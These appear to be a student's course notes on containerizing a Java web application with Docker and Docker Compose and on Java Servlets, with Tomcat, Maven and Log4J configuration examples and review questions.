11. Looking at the default JAR lifecycle, how do phases such as `process-resources`, `compile`, `test`, `package`, `install`, and `deploy` form a complete build pipeline?
12. What are Maven coordinates, and why are `groupId`, `artifactId`, `version`, and `packaging` necessary for identifying and producing a project artifact?
13. How does Maven use local and remote repositories to resolve dependencies and plugins, and what role does the local `~/.m2/repository` cache play?
14. How does Maven's standard project directory structure support the principle of convention over configuration?
15. Why does a plain JAR fail when required external dependencies are missing at runtime, and how does `maven-assembly-plugin` with `jar-with-dependencies` address this problem?

# Containerize a Web Application with Docker

## Table of Contents

- [[#The Deployment Environment Problem|The Deployment Environment Problem]]
- [[#Maven Is Not Enough|Maven Is Not Enough]]
- [[#Containerization|Containerization]]
- [[#Docker — Overview|Docker — Overview]]
  - [[#Containers vs Virtual Machines|Containers vs Virtual Machines]]
  - [[#Main Features of Docker|Main Features of Docker]]
- [[#Docker Objects|Docker Objects]]
  - [[#Docker Images|Docker Images]]
  - [[#Dockerfile|Dockerfile]]
  - [[#Docker Container|Docker Container]]
  - [[#Docker Volumes|Docker Volumes]]
  - [[#Docker Services|Docker Services]]
  - [[#Docker Networks|Docker Networks]]
- [[#Docker Compose|Docker Compose]]
  - [[#Structure of docker-compose.yml|Structure of docker-compose.yml]]
  - [[#Healthcheck and depends_on|Healthcheck and depends_on]]
- [[#Essential Commands|Essential Commands]]
- [[#Summary Table|Summary Table]]

---

## The Deployment Environment Problem

A web application is composed of multiple technologies (Java backend, HTML/CSS/JS frontend, PostgreSQL database) that must be configured and integrated correctly.

The architecture combines:
- **Data layer**: database and persistent data
- **Backend**: business logic and API
- **Frontend**: user interface design in HTML, CSS, and JavaScript

The standard life cycle is:

![[Pasted image 20260512203729.png|580]]
*Figure 1: Build and deployment flow of a Java web application on Tomcat*

**Development → Maven (build) → WAR file → Web Server (Tomcat)**

The problem: if the target server has different versions of PostgreSQL, Java, or Tomcat compared to the development environment, the application may not work. Adapting the code to every environment is costly and error-prone.

Local deployment is usually manageable because you control the data, backend, and frontend layers. The problem appears when the same application must run on a new server with different configurations.

> [!Important] The environment mismatch problem
> Small version differences between the development, build, and runtime environments can cause application failures. A solution is needed that is **independent of the infrastructure** where the webapp is deployed.
> **Insight:** this is the classic "it works on my machine" problem — Docker solves it by packaging everything together.

---

## Maven Is Not Enough

**Maven** standardizes the build, testing, and packaging of Java projects, but **it does not manage the deployment environment**. Compatibility with components such as Tomcat must be guaranteed manually. Maven produces a `.war`, but says nothing about which Tomcat version to use to run it.

---

## Containerization

> [!Important] Containerization
> Containerization encapsulates an application in an **isolated and self-sufficient** execution environment that guarantees consistent behavior across different platforms.
> **Insight:** like shipping a prefabricated house instead of building it on site — it brings everything it needs with it.

Typical use cases:
- You have Python 3.8 installed but need to run Python 3.11 code
- Your OS is Windows but you need tools available only on Linux
- You want to deploy the webapp on Tomcat 10 + PostgreSQL 15 without installing them on the host

---

## Docker — Overview

**Docker** is an open source platform for developing, distributing, and running applications. It separates the application from the underlying infrastructure, enabling faster delivery.

Docker packages and runs applications in isolated environments called **containers**, so multiple containers can run simultaneously on a single host. Documentation: `https://docs.docker.com/get-started/overview/`.

Three-level architecture:
1. **Host** — physical server with its own OS
2. **Docker Engine** — container engine that creates, starts, stops, and manages containers on the host
3. **Containers** — isolated applications, each with its own dependencies and libraries
![[Pasted image 20260512204151.png|500]]
*Figure 2: Conceptual comparison between containers and virtual machines*

### Containers vs Virtual Machines

| | Containers | Virtual Machines |
|---|---|---|
| Isolation | Process-level, they share the host kernel | Complete, separate Guest OS |
| Lightness | Lightweight, fast startup | Heavy, slow startup |
| Portability | High | Low |
| Replication | Easy | Difficult |
| Resources | Efficiently shared | Resource-intensive |

![[docker-containers-stack.jpg|440]]
*Figure 3: Execution stack of a Docker container*

![[docker-vm-stack.jpg|440]]
*Figure 4: Execution stack of a virtual machine*

> [!Important] Key difference between Container and VM
> Containers **share the host OS kernel** — they do not have a Guest OS. VMs include an entire guest operating system, managed by a **Hypervisor**.
> **Insight:** container = isolated process with its own libraries; VM = complete virtual computer.

### Main Features of Docker

- **Portability**: runs on any system that supports Docker, regardless of the underlying OS
- **Efficiency**: lightweight containers that share the host's resources
- **Scalability**: an application can be deployed as multiple parallel containers
- **Isolation**: process-level isolation — applications do not interfere with each other or with the host

---

## Docker Objects

The main Docker objects are: **Images**, **Dockerfiles**, **Container**, **Volumes**, **Services**, **Networks**. Others: plugins, registries.

### Docker Images

> [!Important] Docker Image
> **Read-only** template used to create containers. It contains libraries, dependencies, and instructions to run the application.
> Images are **immutable** and composed of **multiple layers**. Each layer represents changes to the filesystem (adding, removing, or modifying files).
> **Insight:** like a "snapshot" of the environment — each configuration step adds a layer.
>
> **Example:** starting from a Python 3.11 base image, installing required packages, and cloning a repository creates successive image layers.

### Dockerfile

> [!Important] Dockerfile
> Text file with declarative syntax that describes **how to build a Docker image**. It contains instructions about dependencies, configuration, exposed ports, and startup commands.
> An image is obtained by running `docker build` on a Dockerfile. During the build, Docker Engine reads the Dockerfile and executes its instructions layer by layer.

> [!Example] Dockerfile — complete example
> **Context:** CUDA-based image for deep learning training with Python 3.10
> **Code:**
> ```dockerfile
> FROM nvidia/cuda:12.4.1-cudnn-runtime-ubuntu22.04
> 
> RUN apt-get update && apt-get install -y \
>     python3.10 \
>     python3.10-dev \
>     python3-pip \
>     git \
>     curl \
>     build-essential \
>     && rm -rf /var/lib/apt/lists/*
> 
> RUN update-alternatives --install /usr/bin/python python /usr/bin/python3.10 1
> 
> RUN python -m pip install --upgrade pip
> 
> WORKDIR /code/src
> ENV PYTHONPATH=/code
> COPY . /code
> COPY requirements.txt .
> 
> RUN pip install --no-cache-dir -r requirements.txt
> RUN pip install --no-cache-dir dgl -f https://data.dgl.ai/wheels/cu124/repo.html
> RUN pip install torch==2.10.0 --index-url https://download.pytorch.org/whl/cu124
> 
> ENV PATH="/root/.local/bin:${PATH}"
> CMD ["/bin/bash"]
> ```
> **Explanation:** every `RUN`, `COPY`, and `ENV` creates a new layer in the final image.

![[docker-dockerfile-image-container-flow.jpg|580]]
*Figure 5: Transition from Dockerfile to Docker image and running container*

When an image is built, it is possible to create one or more **containers** from it. Each container runs the application using host resources, with its own isolated execution environment and state.

### Docker Container

> [!Important] Docker Container
> **Lightweight and isolated** runtime environment for running applications. Created from a Docker image, managed by the Docker Engine.
> - Multiple containers can run on the same host from the same image without interfering
> - It has a **writable filesystem layer**, but the underlying image remains immutable

### Docker Volumes

> [!Important] Docker Volume
> Mechanism for the **persistence of data** generated and accessed by containers. A volume is a directory or file stored **outside the container's writable layer**: data persists even when the container is stopped or removed.
> Used for: databases, configuration files, logs, any data that must survive the container life cycle.

Volume properties:
- **Bind mount**: data sharing between host and container
- Multiple containers can mount the same volume
- Volumes persist independently of the container life cycle
- They can be attached to and detached from containers dynamically

### Docker Services

A **service** represents an application component (e.g. Tomcat web server, PostgreSQL database). Based on a single Docker image, it can be scaled with multiple container replicas that provide the same functionality.

### Docker Networks

> [!Important] Docker Networks
> Docker containers are isolated and **cannot communicate** with each other by default. Docker networks allow communication between containers.
> Only containers belonging to the **same network** can communicate. The network is specified when the container is instantiated.
> From outside, a container can be reached if the ports are specified correctly.
> **Insight:** the network is like a private virtual switch — only the "connected" containers talk to it.

---

## Docker Compose

> [!Important] Docker Compose
> Tool for managing and deploying **multi-container applications**. It allows defining and configuring multiple Docker services, networks, and volumes as a single application through a **YAML** file.
> The file is called `docker-compose.yml`.

In the course example, the multi-container environment has two services: **Tomcat** for the WAR file and **PostgreSQL** for the database. This lets you deploy the locally generated WAR on the Tomcat and PostgreSQL versions you choose, without adapting the application to the hosting infrastructure.

![[docker-compose-webapp-architecture.jpg|560]]
*Figure 6: Docker Compose architecture with Tomcat web service and PostgreSQL database*

Key advantages:
- Docker Compose automatically creates a **network** for the application
- Services communicate with each other using the **service name as hostname**
- Dependencies between services define the **startup order**

### Structure of docker-compose.yml

> [!Example] docker-compose.yml — Tomcat + PostgreSQL webapp
> **Context:** web application with Java backend (`crane.war`) on Tomcat 10 and PostgreSQL database
> **Code:**
> ```yaml
> services:
> 
>   web:
>     image: tomcat:10
>     ports:
>       - "8080:8080"
>     depends_on:
>       db:
>         condition: service_healthy
>     volumes:
>       - ./crane.war:/usr/local/tomcat/webapps/crane.war
> 
>   db:
>     image: postgres
>     ports:
>       - "5432:5432"
>     environment:
>       - POSTGRES_PASSWORD=postgres
>       - POSTGRES_USER=postgres
>     volumes:
>       - ./crane.sql:/docker-entrypoint-initdb.d/init.sql
>       - ./data/db:/var/lib/postgresql/data
>     healthcheck:
>       test: [ "CMD-SHELL", "pg_isready -U postgres" ]
>       interval: 5s
>       timeout: 10s
>       retries: 50
> ```
> **Line-by-line explanation:**
> - `image`: specifies the image from a registry (or the path to a Dockerfile with `build:`)
> - `ports: "8080:8080"` → `host_port:container_port`. For internal communication between containers: `http://web:8080/`
> - `environment`: environment variables passed to the container. Also used in Tomcat's `context.xml` for the DB connection
> - `volumes: ./crane.war:/usr/local/tomcat/webapps/crane.war` → mounts the WAR from the host into the Tomcat container
> - `volumes: ./crane.sql:/docker-entrypoint-initdb.d/init.sql` → `docker-entrypoint-initdb.d/` is a PostgreSQL convention: all SQL scripts in that directory are executed automatically at the **first instantiation** of the container
> - `volumes: ./data/db:/var/lib/postgresql/data` → persists the database data on the host filesystem

![[docker-compose-file-full.jpg|500]]
*Figure 7: Complete docker-compose.yml example for the web application*

### Healthcheck and depends_on

> [!Important] Healthcheck vs depends_on
> `depends_on` alone **does not wait** for the service to be fully initialized and ready. It only waits for the container to be running.
> To wait for a service to be **healthy** (e.g. PostgreSQL accepts connections), `depends_on` must be combined with `condition: service_healthy` and a `healthcheck`.
> **Insight:** without a healthcheck Tomcat would start while Postgres is still initializing → connection refused.

`healthcheck` parameters:

| Field | Description |
|---|---|
| `test` | Command to execute to verify the status (e.g. `pg_isready -U postgres`) |
| `interval` | Test execution frequency |
| `timeout` | Maximum time to complete the check |
| `retries` | Number of consecutive failures before declaring unhealthy |

---

## Essential Commands

Before running the example, install Docker and Docker Compose following the official documentation:
- Docker: `https://docs.docker.com/get-docker/`
- Docker Compose: `https://docs.docker.com/compose/`

> [!Example] Containerizing the group project
> 1. Install Docker on your machine.
> 2. Modify the `docker-compose.yml` file provided for the Crane project according to your project.
> 3. Place the Compose file in the same folder as the WAR file generated with Maven.
> 4. Open a terminal in the folder containing `docker-compose.yml`.
> 5. Check that the Docker daemon is running, then use the Docker Compose commands below.

Docker Desktop can be used to manage, run, stop, remove, and inspect containers through a graphical interface.

> [!Example] Docker container management
> **Startup:**
> ```bash
> # Creates and starts all containers defined in docker-compose.yml
> docker-compose up
> ```
> **Stop:**
> ```bash
> # Stops and removes the containers
> docker-compose down
> ```
> **Listing:**
> ```bash
> docker ps          # running containers
> docker ps -a       # all containers (including stopped ones)
> ```
> **DB access:**
> ```bash
> docker ps          # find the name of the PostgreSQL container (e.g. docker-db-1)
> docker exec docker-db-1 psql -U postgres   # access the psql CLI
> ```

![[docker-compose-up-output.jpg|560]]
*Figure 8: Startup output of the services with docker compose up*

---

## Summary Table

| Docker Object | Type | Purpose | Notes |
|---|---|---|---|
| **Dockerfile** | Text file | Defines how to build an image | Each instruction = new layer |
| **Image** | Read-only template | Blueprint for creating containers | Immutable, composed of layers |
| **Container** | Runtime instance | Runs the application in isolation | Writable layer above the image |
| **Volume** | Persistent storage | Data that survives the container | Bind mount or named volume |
| **Service** | Logical abstraction | App component (web, db) | Scalable with replicas |
| **Network** | Virtual network | Inter-container communication | Only containers on the same network |
| **Docker Compose** | Orchestrator | Manages multi-container apps | YAML configuration |

| Command | Effect |
|---|---|
| `docker-compose up` | Creates and starts all services |
| `docker-compose down` | Stops and removes the containers |
| `docker ps` | Lists running containers |
| `docker ps -a` | Lists all containers |
| `docker exec <name> <cmd>` | Executes a command inside a container |
| `docker build` | Builds an image from a Dockerfile |

## Questions

1. Why does building a WAR file with Maven not fully solve the deployment environment problem for a Java web application?
2. How does containerization address the "it works on my machine" problem?
3. What is the main architectural difference between a Docker container and a virtual machine, and how does it affect startup time and resource usage?
4. How do Docker images, Dockerfiles, and containers relate to each other in the build-and-run workflow?
5. Why are Docker images described as immutable and layered, and what practical benefits does this give during builds?
6. What happens to data stored only in a container's writable layer when the container is removed, and how do volumes solve this problem?
7. In the Docker Compose architecture diagram, how do the `web` and `db` services communicate with each other?
8. Why can containers in the same Compose application use service names such as `db` as hostnames?
9. How does port mapping such as `"8080:8080"` differ from communication between containers inside the Docker network?
10. Why is mounting a WAR file into the Tomcat container different from copying it permanently into an image?
11. What role does `/docker-entrypoint-initdb.d/` play in the PostgreSQL service, and why does it matter that scripts run at first initialization?
12. Why is `depends_on` alone insufficient when Tomcat depends on PostgreSQL, and how does a healthcheck improve startup reliability?
13. How would you use `docker-compose up`, `docker-compose down`, `docker ps`, and `docker exec` while debugging a multi-container web application?
14. What are the tradeoffs between using a ready-made image such as `tomcat:10` and building a custom image from a Dockerfile?
15. Which parts of the Tomcat + PostgreSQL example should be persistent, and which can safely be recreated from images or configuration?

# Java Servlet

## Table of Contents

- [[#Web Application Technologies|Web Application Technologies]]
  - [[#Browser and Server Architecture|Browser and Server Architecture]]
  - [[#Technologies Overview|Technologies Overview]]
- [[#Jakarta Enterprise Edition|Jakarta Enterprise Edition]]
  - [[#Package Naming|Package Naming]]
  - [[#Multi-tiered Architecture|Multi-tiered Architecture]]
- [[#Java Servlet|Java Servlet]]
  - [[#Definition and Properties|Definition and Properties]]
  - [[#jakarta.servlet Main Classes|jakarta.servlet Main Classes]]
  - [[#jakarta.servlet.http Main Classes|jakarta.servlet.http Main Classes]]
  - [[#UML Class Diagram|UML Class Diagram]]
  - [[#Servlet Lifecycle|Servlet Lifecycle]]
- [[#Apache Tomcat|Apache Tomcat]]
- [[#Project Setup|Project Setup]]
  - [[#Directory Structure|Directory Structure]]
  - [[#web.xml Configuration|web.xml Configuration]]
  - [[#Maven POM Configuration|Maven POM Configuration]]
- [[#Servlet Examples|Servlet Examples]]
  - [[#HelloWorld Servlet|HelloWorld Servlet]]
  - [[#Servlet Sequence Diagram|Servlet Sequence Diagram]]
  - [[#Servlet with Log4J|Servlet with Log4J]]
  - [[#GET and POST Forms|GET and POST Forms]]
- [[#Summary Table|Summary Table]]

---

## Web Application Technologies

### Browser and Server Architecture

![[servlet-browser-server-architecture.jpg|560]]
*Figure 1: Browser-server architecture for a servlet-based web application*

**Web Browser** components:
- **User Interface** — what user sees
- **Browser/Rendering Engine** — renders HTML/CSS
- **Document Object Model (DOM)** — in-memory tree of the page
- **Scripting Engine** — executes JavaScript
- **Parsing Engine** — parses HTML/CSS
- **Networking** — handles TCP/IP

**Web Server** components:
- **Request Analysis** — parses incoming HTTP request
- **Access Control** — authentication/authorization checks
- **Resource Handler** — dispatches to static or dynamic resource
- **Static Resources** — files served as-is (HTML, images, CSS)
- **Dynamic Resources** — servlets, scripts that generate content at runtime
- **Logging** — records activity
- **Networking** — handles TCP/IP

Communication uses **HTTP Request / HTTP Response** between browser and server.

### Technologies Overview
![[Pasted image 20260512114912.png|440]]
*Figure 2: Comparison between client-side and server-side components*

| Side | Programs | Scripts |
|------|----------|---------|
| **Server-side** | CGI, Java Servlet, JSP, PHP, ASP/ASP.NET, Django (Python via WSGI), Ruby on Rails | — |
| **Client-side** | Java Applet, ActiveX, Adobe Flash, Apache Flex | JavaScript, VBScript, AJAX (Web 2.0) |

---

## Jakarta Enterprise Edition

> [!Important] Jakarta EE
> **Jakarta Enterprise Edition (Jakarta EE)** is the standardized platform for developing multi-tiered enterprise applications. It defines APIs for Web development (servlets, REST, etc.) and is executed by a **Web container**.
>
> - **Web container**: implements the Jakarta EE API and executes web components
> - **Web component**: a part of a web app (servlet, JSP, …) hosted by the container
>
> **Intuition:** Jakarta EE is the spec; Tomcat is an implementation of the web container portion.

### Package Naming

| Phase | Organization | Package prefix |
|-------|-------------|----------------|
| J2EE / Java EE ≤ 8 | Sun Microsystems / Oracle | `javax.*` |
| Jakarta EE ≥ 9 | Eclipse Foundation | `jakarta.*` |

Since **2018**, Java EE has migrated into the open-source **Jakarta EE** project under the Eclipse Foundation. **Jakarta EE 8** is the same platform as Java EE 8, with the Java name changed into Jakarta. **Jakarta EE 9** is the release that introduced the package rename from `javax.*` to `jakarta.*`.

Key transition: **Tomcat 9** → `javax.*`; **Tomcat 10+** → `jakarta.*`. Course uses **Tomcat 11**. Jakarta@Eclipse must not be confused with the retired Apache Software Foundation Jakarta sub-project.

Relevant version evolution (Servlet spec):

| Jakarta EE | Servlet | JSP | Java SE base |
|------------|---------|-----|--------------|
| Java EE 6 | 3.0 | 2.2 | SE 6 |
| Java EE 7 | 3.1 | 2.3 | SE 7 |
| Java EE 8 | 4.0 | 2.3 | SE 8 |
| Jakarta EE 9 | 5.0 | 3.0 | SE 8 |
| Jakarta EE 10 | 6.0 | 3.1 | SE 11 |
| Jakarta EE 11 | 6.1 | 4.0 | SE 21 |
| Jakarta EE 12 | 6.2 | 4.1 | SE 21 |

### Multi-tiered Architecture

![[servlet-javaee-multitier-architecture.jpg|500]]
*Figure 3: Java EE multi-tier architecture with client, web, business, and data tiers*

Four tiers:
1. **Client Tier** — Web browser, applets, application clients
2. **Web Tier** — Servlets, JSP pages, JavaBeans (optional)
3. **Business Tier** — EJBs (Session Beans, Message-Driven Beans), JPA Entities
4. **EIS Tier** — Databases and legacy systems

---

## Java Servlet

### Definition and Properties

> [!Important] Java Servlet Definition
> A **servlet** is a ==Java-based Web component, managed by a container, that generates dynamic content==. Servlets are:
> - ==Platform-independent Java classes== compiled to bytecode
> - Loaded dynamically into and run by a Java-enabled web server
> - **Not thread-safe** — the container may send concurrent requests to a single servlet instance; developers must synchronize access to shared resources (files, network connections, instance variables)
>
> **Intuition:** a servlet is like a controller that receives an HTTP request and writes an HTTP response programmatically.

Packages: `jakarta.servlet` and `jakarta.servlet.http` (formerly `javax.*` up to Java EE 8).

### jakarta.servlet Main Classes

| Class/Interface | Role |
|----------------|------|
| `Servlet` | Interface — defines methods all servlets must implement |
| `ServletRequest` | Provides client request information to a servlet |
| `ServletResponse` | Assists a servlet in sending a response |
| `ServletConfig` | Passes container-to-servlet initialization info |
| `ServletContext` | Servlet's view of the web app; communication with container (MIME types, logging, dispatch) |
| `Filter` | Performs filtering on requests/responses (auth, logging, compression, image conversion) |

### jakarta.servlet.http Main Classes

| Class/Interface | Role |
|----------------|------|
| `HttpServlet` | Abstract class — subclass this to create HTTP servlets |
| `HttpServletRequest` | Extends `ServletRequest` with HTTP-specific request info |
| `HttpServletResponse` | Extends `ServletResponse` with HTTP-specific response functionality |
| `Cookie` | Small piece of info sent to browser, stored, sent back later |
| `HttpSession` | Identifies a user across multiple requests; stores per-user state |
| `Part` | Represents a part of a `multipart/form-data` upload (file or form field) |

### UML Class Diagram

![[servlet-uml-class-diagram.jpg|560]]
*Figure 4: UML class diagram of the servlet project*

Key relationships:
- `HttpServlet` extends `GenericServlet` which implements `Servlet`
- `HttpServletRequest` and `HttpServletResponse` extend `ServletRequest`/`ServletResponse`
- `HttpSession`, `Cookie`, `Part`, and `Filter` are companions used by `HttpServletRequest`/`HttpServletResponse`
- `ServletContext` and `ServletConfig` are used by `Servlet` during init and runtime

### Servlet Lifecycle

> [!Important] Servlet Lifecycle — Three Methods
> The container calls these exactly once or per-request:
>
> 1. **`init(ServletConfig)`** — called **once** after instantiation, before any requests. Must complete successfully before `service()` is ever called. Gives access to `ServletContext` via `ServletConfig`.
>
> 2. **`service(ServletRequest, ServletResponse)`** — called **per request**. For `HttpServlet`, this is specialized into:
>    - `doGet(HttpServletRequest, HttpServletResponse)`
>    - `doPost(HttpServletRequest, HttpServletResponse)`
>    - `doPut(HttpServletRequest, HttpServletResponse)`
>    - `doDelete(HttpServletRequest, HttpServletResponse)`
>
> 3. **`destroy()`** — called **once** when the servlet is taken out of service. Only called after all active `service()` threads exit (or timeout). Used for cleanup: closing files, releasing connections, persisting state.
>
> **Intuition:** init → [service × N] → destroy.

> [!Warning] Thread Safety
> Containers run servlets in multithreaded environments. Concurrent requests hit the **same servlet instance**. Never store request-specific state in instance variables — use local variables or `ThreadLocal`.

---

## Apache Tomcat

- Reference: `http://tomcat.apache.org/`
- Tomcat 11 documentation: `https://tomcat.apache.org/tomcat-11.0-doc/index.html`
- **Tomcat 9** → Java EE → `javax.*` packages
- **Tomcat 10+** → Jakarta EE → `jakarta.*` packages
- Course uses **Tomcat 11** (Jakarta EE, `jakarta.*`)
- Manager UI at `http://localhost:8080/manager/html/`
- Logs in `$CATALINA_BASE/logs/`

Deployment: upload `.war` file via Manager UI → Tomcat unpacks and starts the app.

If the web application is correctly installed and running, the **Start** button is disabled in the Manager UI. Use **Stop** to stop the app and **Undeploy** to remove it.

---

## Project Setup

### Directory Structure

```
src/
  main/
    database/       SQL schema files
    java/           Java source (servlets, helpers)
    resources/      Property files, log4j2.xml
    webapp/
      css/
      html/
      js/
      jsp/
      media/
      WEB-INF/      web.xml (NOT publicly accessible)
  test/             JUnit tests
javadoc/            Generated documentation
target/             Compiled classes and WAR
```

> [!Important] WEB-INF
> `WEB-INF/` is **never served directly** by the container. It holds `web.xml` and private resources (compiled classes, jars). Browsers cannot access it directly.

### web.xml Configuration

> [!Example] Static HTML Welcome Page
> A static HTML-only webapp can expose a page from the webapp root by configuring a welcome file:
>
> ```xml
> <welcome-file-list>
>   <welcome-file>/html/hello.html</welcome-file>
> </welcome-file-list>
> ```
>
> The corresponding `hello.html` page can include normal HTML metadata, such as `charset`, `description`, `author`, `title`, and then render `"Hello, world!"` in the body.

> [!Example] Servlet Declaration and URL Mapping
> **Context:** `WEB-INF/web.xml` wires servlet classes to URL patterns. When the container receives a request matching a pattern, it instantiates the servlet and calls `service()`.
>
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <web-app id="hello-world-webapp" version="4.0"
>          xmlns="http://xmlns.jcp.org/xml/ns/javaee"
>          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>          xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
>                              http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd">
>
>   <display-name>Hello World Servlet</display-name>
>   <description>Example servlet answering "Hello, world!" to GET.</description>
>
>   <!-- Declare the servlet and its class -->
>   <servlet>
>     <servlet-name>HelloWorld</servlet-name>
>     <servlet-class>it.unipd.dei.webapp.HelloWorldServlet</servlet-class>
>   </servlet>
>
>   <!-- Map URL patterns to the servlet -->
>   <servlet-mapping>
>     <servlet-name>HelloWorld</servlet-name>
>     <url-pattern>/helloworld</url-pattern>
>   </servlet-mapping>
>   <servlet-mapping>
>     <servlet-name>HelloWorld</servlet-name>
>     <url-pattern>/hello</url-pattern>
>   </servlet-mapping>
>   <servlet-mapping>
>     <servlet-name>HelloWorld</servlet-name>
>     <url-pattern>/ciao</url-pattern>
>   </servlet-mapping>
>
> </web-app>
> ```
>
> **Explanation:** One servlet class can be bound to multiple URL patterns. The container matches the request URI against declared patterns.

For a static HTML-only app, use `<welcome-file-list>` instead of servlet mappings:

```xml
<welcome-file-list>
  <welcome-file>/html/hello.html</welcome-file>
</welcome-file-list>
```

### Maven POM Configuration

> [!Important] WAR Packaging
> Web apps must be packaged as a **WAR (Web ARchive)** file — a zip with a specific layout. Set `<packaging>war</packaging>` in `pom.xml`.

> [!Example] Essential POM for a Servlet Project
> ```xml
> <packaging>war</packaging>
>
> <properties>
>   <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
> </properties>
>
> <build>
>   <defaultGoal>compile</defaultGoal>
>   <sourceDirectory>${basedir}/src/main/java</sourceDirectory>
>   <directory>${basedir}/target</directory>
>   <finalName>${project.artifactId}-${project.version}</finalName>
>
>   <plugins>
>     <!-- Compiler -->
>     <plugin>
>       <groupId>org.apache.maven.plugins</groupId>
>       <artifactId>maven-compiler-plugin</artifactId>
>       <version>3.8.0</version>
>       <configuration><source>1.8</source><target>1.8</target></configuration>
>     </plugin>
>
>     <!-- WAR packager — must point to web.xml -->
>     <plugin>
>       <groupId>org.apache.maven.plugins</groupId>
>       <artifactId>maven-war-plugin</artifactId>
>       <version>3.2.2</version>
>       <configuration>
>         <webXml>${basedir}/src/main/webapp/WEB-INF/web.xml</webXml>
>       </configuration>
>     </plugin>
>
>     <!-- Javadoc -->
>     <plugin>
>       <groupId>org.apache.maven.plugins</groupId>
>       <artifactId>maven-javadoc-plugin</artifactId>
>       <version>3.1.0</version>
>       <configuration>
>         <reportOutputDirectory>${basedir}/javadoc</reportOutputDirectory>
>         <show>protected</show>
>       </configuration>
>     </plugin>
>   </plugins>
> </build>
>
> <!-- Servlet API: provided because Tomcat already has it -->
> <dependencies>
>   <dependency>
>     <groupId>javax.servlet</groupId>
>     <artifactId>javax.servlet-api</artifactId>
>     <version>4.0.0</version>
>     <scope>provided</scope>   <!-- NOT packaged in WAR -->
>   </dependency>
> </dependencies>
> ```
>
> **Key point:** `<scope>provided</scope>` means the servlet API is needed to compile locally but Tomcat already ships it — do not bundle it in the WAR.

The complete POM examples in the slides also include project metadata: `<url>`, `<inceptionYear>`, `<developers>`, `<licenses>`, and `<organization>`.

Maven lifecycle phases used: `resources` → `compile` → `test` → `package` (produces `.war`) → `install` → `deploy`.

---

## Servlet Examples

### HelloWorld Servlet

> [!Example] Minimal GET Servlet
> **Context:** extend `HttpServlet`, override `doGet`, write HTML to the response.
>
> ```java
> public class HelloWorldServlet extends HttpServlet {
>
>     public void doGet(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>
>         // 1. Set MIME type of response
>         res.setContentType("text/html; charset=utf-8");
>
>         // 2. Get writer for response body
>         PrintWriter out = res.getWriter();
>
>         // 3. Write HTML
>         out.printf("<!DOCTYPE html>%n");
>         out.printf("<html lang=\"en\">%n");
>         out.printf("<head>%n");
>         out.printf("<meta charset=\"utf-8\">%n");
>         out.printf("<title>HelloWorld Servlet Response</title>%n");
>         out.printf("</head>%n");
>         out.printf("<body>%n");
>         out.printf("<h1>HelloWorld Servlet Response</h1>%n");
>         out.printf("<hr/>%n");
>         out.printf("<p>Hello, world!%n</p>%n");
>         out.printf("</body>%n");
>         out.printf("</html>%n");
>
>         // 4. Flush and close (don't forget)
>         out.flush();
>         out.close();
>
>         // 5. Log
>         System.out.printf("[INFO] HelloWorldServlet - %s - Request successfully served.%n",
>             new Timestamp(System.currentTimeMillis()).toString());
>     }
> }
> ```
>
> **Key steps:** set content type → get writer → write HTML → flush → close → log.

### Servlet Sequence Diagram

![[servlet-sequence-diagram.jpg|560]]
*Figure 5: Request-response sequence during the first servlet invocation*

**First request flow:**
1. Browser sends `GET /hello-world-servlet/hello`
2. Container instantiates `HelloWorldServlet` (1.1)
3. Container calls `init(ServletConfig)` (1.2)
4. Container calls `service(HttpServletRequest, HttpServletResponse)` (1.4)
5. `service()` internally dispatches to `doGet()` (1.4.1)
6. `doGet()` writes the response, returns (1.4.2)
7. Browser receives HTML page (1.4.3)

**Subsequent requests:** servlet already instantiated and initialized — container calls `service()` directly (step 2).

### Servlet with Log4J

Reference: `http://logging.apache.org/log4j/2.x/index.html`. The logging example adds Log4J dependencies, a `LogContext` helper class, and a `log4j2.xml` configuration file to the project.

> [!Important] Log4J 2 Structure
> - **Logger** — named object that issues log messages; organized in a **hierarchy** (tree). Root is `Root`. Child loggers inherit appenders from parents.
> - **Appender** — destination for log messages (file, console, etc.)
> - **Level** (ascending): `TRACE < DEBUG < INFO < WARN < ERROR < FATAL`. Messages below the configured level are discarded.
> - **ThreadContext (MDC)** — per-thread key-value store for contextual info (user, IP, action, resource) automatically included in log output.

> [!Example] LogContext Helper Class
> **Context:** wrapper over `Log4J ThreadContext` to attach request-scoped metadata to log messages.
>
> ```java
> import org.apache.logging.log4j.ThreadContext;
>
> public final class LogContext {
>
>     private static final String USER     = "USER";
>     private static final String IP       = "IP";
>     private static final String ACTION   = "ACTION";
>     private static final String RESOURCE = "RESOURCE";
>
>     public static void setUser(final String user) {
>         if (user != null && !user.isEmpty()) ThreadContext.put(USER, user);
>     }
>     public static void removeUser() { ThreadContext.remove(USER); }
>
>     public static void setIPAddress(final String ip) {
>         if (ip != null && !ip.isEmpty()) ThreadContext.put(IP, ip);
>     }
>     public static void removeIPAddress() { ThreadContext.remove(IP); }
>
>     public static void setAction(final String action) {
>         if (action != null) ThreadContext.put(ACTION, action);
>     }
>     public static void removeAction() { ThreadContext.remove(ACTION); }
>
>     public static void setResource(final String resource) {
>         if (resource != null && !resource.isEmpty()) ThreadContext.put(RESOURCE, resource);
>     }
>     public static void removeResource() { ThreadContext.remove(RESOURCE); }
>
>     private LogContext() {
>         throw new AssertionError("No instances of " + LogContext.class.getName() + " allowed.");
>     }
> }
> ```

> [!Example] Servlet Using Log4J
> ```java
> public class HelloWorldServlet extends HttpServlet {
>
>     protected static final Logger LOGGER =
>         LogManager.getLogger(HelloWorldServlet.class, StringFormatterMessageFactory.INSTANCE);
>
>     public void doGet(HttpServletRequest req, HttpServletResponse res)
>             throws IOException {
>
>         // Set MDC context for this request
>         LogContext.setIPAddress(req.getRemoteAddr());
>         LogContext.setResource(req.getRequestURI());
>         LogContext.setAction("HELLO_WORLD");
>
>         try {
>             res.setContentType("text/html; charset=utf-8");
>             PrintWriter out = res.getWriter();
>             // ... write HTML ...
>             out.flush();
>             out.close();
>             LOGGER.info("Request successfully served.");
>         } catch (Exception e) {
>             LOGGER.error("Unable to serve request.", e);
>             throw e;
>         } finally {
>             // Always clear MDC to avoid leaking context across requests
>             LogContext.removeIPAddress();
>             LogContext.removeAction();
>             LogContext.removeResource();
>         }
>     }
> }
> ```
>
